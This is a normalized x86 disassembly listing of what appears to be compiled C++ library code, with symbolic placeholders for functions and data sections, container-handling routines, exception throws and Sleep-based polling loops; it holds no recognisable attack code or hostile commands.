mov esi [ ecx + 0x14 ]
jb r-xdata
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0xc ]
push edi
push eax
push esi
call sub_10018b35
add esp 0xc
cmp eax 0x40b
jne r-xdata
mov al 0x1
push r--data
lea ecx [ esp + 0x14 ]
call sub_10001c7f
and [ esp + 0x60 ] 0x0
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_10002075
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_10027dd1
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10012762
push 0x4
mov eax sub_1004eaa2
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x18 ]
push eax
call sub_1000dd28
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d109
call sub_100282db
retn
sub_10012797
push 0x44
mov eax sub_1004e27f
call sub_10028203
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ esi + 0x18 ]
call sub_10011a08
push [ ebp + 0x8 ]
call sub_10014f8e
mov al [ esi + 0xd ]
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10027dd1
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push esi
call sub_10014f8e
call sub_100282db
retn 0x8
call sub_10003d5c
sub_10012811
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
mov al [ ecx + 0x30 ]
push ebx
push esi
push edi
mov [ esp + 0x1c ] ecx
test al al
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea edi [ ecx + 0x18 ]
call sub_10024832
cmp eax [ esp + 0x30 ]
je r-xdata
push 0x64
call [ Sleep@IAT ]
mov eax [ esp + 0x1c ]
mov al [ eax + 0x30 ]
test al al
je r-xdata
lea esi [ esp + 0x20 ]
call sub_100046ab
mov eax [ eax ]
cmp [ eax + 0x50 ] 0x1
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax [ esp + 0x34 ]
je r-xdata
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x28 ]
call sub_10018308
mov eax [ esp + 0x28 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x24 ] eax
lea esi [ esp + 0x20 ]
call sub_1000dd50
jmp r-xdata
mov al [ eax + 0xc ]
cmp al 0x1
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x30 ]
call sub_10018308
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ edi + 0x10 ]
lea ebx [ ecx + 0x8 ]
mov [ esp + 0x14 ] eax
cmp ebx eax
je r-xdata
mov eax [ edi + 0x10 ]
push eax
add eax 0xfffffff8
call sub_1000de39
mov ebx [ esp + 0x24 ]
add [ edi + 0x10 ] 0xfffffff8
lea esi [ esp + 0x14 ]
call sub_10018308
mov [ esp + 0x10 ] ecx
sub [ esp + 0x10 ] ebx
mov eax [ esp + 0x10 ]
lea esi [ eax + ebx ]
mov eax ebx
call sub_10011f26
add ebx 0x8
cmp ebx [ esp + 0x14 ]
jne r-xdata
sub_10012905
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
mov esi eax
mov [ esi + 0x30 ] 0x1
mov al [ esi + 0xd ]
push edi
test al al
je r-xdata
lea edi [ esi + 0x18 ]
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x18 ]
call sub_10018308
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
push esi
call sub_10014e75
call sub_10024832
cmp eax [ esp + 0x20 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ esp + 0x10 ]
call sub_100046ab
push [ eax ]
call sub_10014f38
call sub_1000dd50
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x24 ]
je r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x20 ]
call sub_10018308
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_100129ae
push 0x14
mov eax sub_1004d462
call sub_10028203
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x18 ]
lea eax [ ebx + 0x54 ]
push ecx
mov [ edi ] r--data
call sub_100051c8
mov esi eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebx + 0x54 ]
call sub_10008a30
push [ esi + 0x4 ]
push [ esi ]
lea esi [ edi + 0x4 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_1000c105
push [ ebp + 0xc ]
lea ecx [ edi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000136c
push r--data
lea ecx [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_1000134a
push r--data
lea ecx [ edi + 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000134a
lea eax [ ebx + 0x70 ]
push eax
lea eax [ edi + 0x74 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10001392
lea eax [ ebx + 0xa4 ]
push eax
lea ecx [ edi + 0x8c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000136c
mov eax [ ebx + 0x34 ]
push 0xa
xor edx edx
pop ecx
div ecx
mov [ edi + 0xa8 ] eax
mov eax edi
call sub_100282db
retn 0x8
sub_10012a81
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
push ebx
push 0x1
lea ecx [ edi + 0x8c ]
mov [ edi ] r--data
call sub_10001500
lea esi [ edi + 0x74 ]
call sub_10001574
push [ esi ]
call sub_100242e6
pop ecx
push ebx
push 0x1
lea ecx [ edi + 0x58 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ edi + 0x3c ]
call sub_10001500
push ebx
push 0x1
lea ecx [ edi + 0x20 ]
call sub_10001500
push ebx
push 0x1
lea ecx [ edi + 0x4 ]
call sub_10002020
mov [ edi ] r--data
pop edi
pop esi
pop ebx
retn
sub_10012ae2
push ebp
sub esp 0xe4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xe4 ] eax
push 0x98
mov eax sub_1004f41b
call sub_10028236
mov eax [ ebp + 0xf0 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xf4 ]
mov esi ecx
mov [ ebp - 0x24 ] eax
lea eax [ esi + 0x74 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x60 ] r--data
call sub_10001392
xor ebx ebx
push ebx
push 0x1
mov [ ebp - 0x4 ] ebx
call sub_100018cf
pop ecx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
lea ecx [ ebp - 0x44 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x11 ] 0x1
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_10025831
push eax
call sub_10024b48
pop ecx
pop ecx
lea eax [ ebp - 0x60 ]
call sub_10012e01
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x18 ] ebx
lea ecx [ ebp - 0x60 ]
call sub_10012d3d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xe4 ]
xor ecx ebp
call sub_100242d7
add ebp 0xe8
leave
retn 0x8
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x9
call sub_10002075
push r--data
lea eax [ ebp - 0xa4 ]
push eax
call sub_10027dd1
int3
lea ecx [ ebp + 0xac ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x3
call sub_10012d60
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp + 0xac ]
push eax
lea eax [ esi + 0x58 ]
push eax
lea eax [ esi + 0x3c ]
push eax
lea eax [ esi + 0x20 ]
push eax
lea eax [ esi + 0x4 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10013f93
push ebx
lea ecx [ ebp + 0xc8 ]
mov [ ebp + 0xe0 ] 0xf
call sub_10002004
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x11 ] bl
jne r-xdata
push [ esi + 0xa8 ]
call [ Sleep@IAT ]
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp + 0xc8 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x7
call sub_10014084
push ebx
push 0x1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x6
call sub_10002020
lea eax [ ebp + 0xc8 ]
push eax
push [ ebp - 0x1c ]
lea ecx [ ebp ]
call sub_10014084
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0xc8 ]
mov [ ebp - 0x11 ] 0x1
call sub_10002020
lea ecx [ ebp ]
call sub_1001402b
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_10001500
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
push 0xffffffff
push ebx
lea eax [ ebp + 0xc8 ]
push eax
call sub_10001f30
push ebx
push 0x1
lea ecx [ ebp + 0xc8 ]
call sub_10002020
lea ecx [ ebp ]
call sub_1001402b
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_10001500
cmp [ ebp + 0xdc ] ebx
jbe r-xdata
inc [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x50 ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x18 ] eax
jae r-xdata
sub_10012cf8
mov esi [ ebp - 0x20 ]
xor ebx ebx
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x50 ]
push 0x1c
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x18 ] eax
jae r-xdata
cmp [ ebp - 0x11 ] 0x1
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea ecx [ ebp - 0x60 ]
call sub_10012d3d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xe4 ]
xor ecx ebp
call sub_100242d7
add ebp 0xe8
leave
retn 0x8
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x9
call sub_10002075
push r--data
lea eax [ ebp - 0xa4 ]
push eax
call sub_10027dd1
int3
lea ecx [ ebp + 0xac ]
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x3
call sub_10012d60
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp + 0xac ]
push eax
lea eax [ esi + 0x58 ]
push eax
lea eax [ esi + 0x3c ]
push eax
lea eax [ esi + 0x20 ]
push eax
lea eax [ esi + 0x4 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10013f93
push ebx
lea ecx [ ebp + 0xc8 ]
mov [ ebp + 0xe0 ] 0xf
call sub_10002004
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x11 ] bl
jne r-xdata
push [ esi + 0xa8 ]
call [ Sleep@IAT ]
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001c7f
lea eax [ ebp + 0xc8 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x7
call sub_10014084
push ebx
push 0x1
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x6
call sub_10002020
lea eax [ ebp + 0xc8 ]
push eax
push [ ebp - 0x1c ]
lea ecx [ ebp ]
call sub_10014084
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0xc8 ]
mov [ ebp - 0x11 ] 0x1
call sub_10002020
lea ecx [ ebp ]
call sub_1001402b
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_10001500
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x24 ]
push 0xffffffff
push ebx
lea eax [ ebp + 0xc8 ]
push eax
call sub_10001f30
push ebx
push 0x1
lea ecx [ ebp + 0xc8 ]
call sub_10002020
lea ecx [ ebp ]
call sub_1001402b
push ebx
push 0x1
lea ecx [ ebp + 0xac ]
call sub_10001500
cmp [ ebp + 0xdc ] ebx
jbe r-xdata
inc [ ebp - 0x18 ]
jmp r-xdata
sub_10012d60
push 0x18
mov eax sub_1004d408
call sub_10028203
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
cmp [ esi + 0x38 ] eax
jne r-xdata
mov edi [ esi + 0x38 ]
call sub_10024b5a
xor edx edx
div edi
mov ebx [ esi + 0x34 ]
add esi 0x1c
lea edi [ ebp - 0x14 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] edx
call sub_100130f6
mov ebx [ ebp - 0x24 ]
mov esi edi
call sub_1001311c
mov eax edi
call sub_10012f6a
mov ecx [ ebp - 0x18 ]
push eax
call sub_1000136c
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
push eax
push [ ebp - 0x20 ]
call sub_10012f25
mov eax [ ebp - 0x18 ]
call sub_100282db
retn
mov eax esi
call sub_10012e01
sub_10012e01
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
mov esi eax
lea ecx [ esi + 0x4 ]
mov eax [ ecx + 0x10 ]
sub eax [ ecx + 0xc ]
push edi
push 0x1c
mov [ esp + 0x14 ] ecx
pop ecx
cdq
idiv ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x34 ] esp
mov edi eax
call sub_10003efc
add esi 0x1c
push edi
mov ecx esi
call sub_10013168
mov ebx [ esi + 0x18 ]
lea edi [ esp + 0x20 ]
call sub_100130f6
mov edi [ esp + 0x10 ]
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x28 ]
call sub_10018308
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x10 ]
call sub_10018308
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov esi [ esp + 0x20 ]
lea edi [ esp + 0x30 ]
mov [ esp + 0x18 ] esi
mov ebx eax
lea eax [ esp + 0x18 ]
call sub_1001325c
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
cmp esi [ esp + 0x2c ]
jne r-xdata
mov eax [ esi ]
mov esi [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea eax [ esp + 0x18 ]
call sub_10012f6a
push 0xffffffff
push 0x0
push esi
mov ecx eax
call sub_10001450
inc [ esp + 0x1c ]
add esi 0x1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10012ed9
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
call sub_1001322c
push edi
mov edi [ esi + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edi ebx
ja r-xdata
dec edi
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
cmp eax ebx
je r-xdata
push [ eax ]
call sub_100242e6
pop ecx
push [ esi ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] ebx
call sub_100242e6
pop ecx
pop esi
pop ebx
retn
push eax
call sub_100242e6
pop ecx
sub_10012f25
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ ebp + 0x10 ]
push ebx
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x14 ]
push esi
xor ebx ebx
inc ebx
lea esi [ esp + 0x8 ]
mov [ esp + 0xc ] eax
call sub_1001311c
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10012fd3
mov eax [ ebp + 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10012f6a
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov esi [ esi ]
test esi esi
je r-xdata
call sub_10024832
mov eax [ eax + 0x1c ]
add eax [ ecx + 0x18 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ eax + 0x14 ] edi
ja r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
mov eax [ eax + edi * 4 ]
pop edi
pop esi
retn
sub edi [ eax + 0x14 ]
sub_10012fd3
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov esi eax
lea edi [ ebp - 0x20 ]
call sub_100130f6
mov ebx [ ebp + 0x18 ]
lea edi [ ebp - 0x18 ]
call sub_100130f6
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x10 ]
call sub_100130f6
mov ebx [ ebp - 0x20 ]
test ebx ebx
je r-xdata
call sub_10024832
cmp ebx [ ebp - 0x10 ]
je r-xdata
call sub_10024832
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov edi [ ebp - 0x1c ]
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0xc ] edi
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] eax
je r-xdata
call sub_10024832
cmp eax [ ebp - 0x18 ]
je r-xdata
mov ebx [ esi + 0x1c ]
mov eax [ ebp - 0x14 ]
add ebx [ esi + 0x18 ]
sub eax edi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call sub_100130f6
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x1c ]
add ebx [ esi + 0x18 ]
call sub_100130f6
push [ ebp - 0x1c ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push eax
call sub_1001386d
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov ebx [ esi + 0x18 ]
call sub_100130f6
push [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push eax
call sub_10013818
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x14 ]
lea edi [ ebp - 0x28 ]
cmp [ ebp - 0xc ] eax
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x28 ]
call sub_100130f6
mov ebx [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
call sub_1001325c
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
call sub_1001322c
dec [ ebp - 0x8 ]
jne r-xdata
call sub_100131fb
dec [ ebp - 0x8 ]
jne r-xdata
jmp r-xdata
sub_100130f6
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10024832
mov eax [ esi + 0x18 ]
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x1c ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_1001311c
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
mov edi [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor edi edi
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
call sub_10024832
test eax eax
je r-xdata
mov ecx [ ecx + 0x1c ]
mov edx [ esi + 0x4 ]
add ecx [ edi + 0x18 ]
add edx ebx
pop edi
cmp edx ecx
ja r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ esi + 0x4 ] ebx
mov eax esi
retn
cmp edx [ eax + 0x18 ]
jae r-xdata
sub_10013168
push 0x1c
mov eax sub_1004ddd4
call sub_10028203
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x1c ]
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_100130f6
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
mov ecx esi
push eax
mov eax [ ebp + 0x8 ]
sub eax [ esi + 0x1c ]
push eax
call sub_10013285
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_10001500
call sub_100282db
retn 0x20
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_100130f6
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x20 ]
call sub_100130f6
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_1001325c
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_10012fd3
sub_100131fb
cmp [ esi + 0x1c ] 0x0
je r-xdata
retn
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_10001500
inc [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
cmp [ esi + 0x14 ] eax
ja r-xdata
dec [ esi + 0x1c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
and [ esi + 0x18 ] 0x0
sub_1001322c
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
retn
mov ecx [ esi + 0x18 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_10001500
dec [ esi + 0x1c ]
jne r-xdata
sub eax ecx
and [ esi + 0x18 ] 0x0
sub_1001325c
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1001311c
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop esi
leave
retn
sub_10013285
push 0x7c
mov eax sub_1004d3c7
call sub_100282a2
mov eax [ ebp + 0xc ]
mov esi ecx
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x7c ]
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x70 ] eax
call sub_100130f6
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10024832
cmp eax [ ebp - 0x7c ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x78 ]
mov [ ebp - 0x5c ] eax
mov eax [ esi + 0x1c ]
mov ebx [ ebp - 0x5c ]
mov edi eax
sub edi ebx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x78 ] eax
cmp ebx edi
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
mov [ ebp - 0x54 ] edi
sub edi ebx
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_1000136c
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_10013685
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_10013818
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100138c2
lea ecx [ ebp - 0x50 ]
call sub_100130f6
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_10013631
dec ebx
jmp r-xdata
call sub_1001325c
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x54 ] eax
call sub_1000136c
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001325c
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
push [ ebp - 0x54 ]
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x58 ]
push [ ecx + 0x4 ]
push [ ecx ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1001386d
mov ebx [ esi + 0x18 ]
add esp 0x1c
lea edi [ ebp - 0x64 ]
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1001325c
mov esi eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x64 ]
call sub_1001325c
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x34 ]
push eax
call sub_100138c2
lea ecx [ ebp - 0x34 ]
jmp r-xdata
dec ebx
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_100135e3
dec [ ebp - 0x54 ]
jmp r-xdata
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x70 ]
mov eax esi
call sub_100135e3
dec edi
jmp r-xdata
call sub_100282fe
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_100130f6
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_100130f6
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1001325c
call sub_10012f6a
push eax
mov eax esi
call sub_10013631
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
add esp 0x14
push 0x0
push 0x1
call sub_10001500
jmp r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_100130f6
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
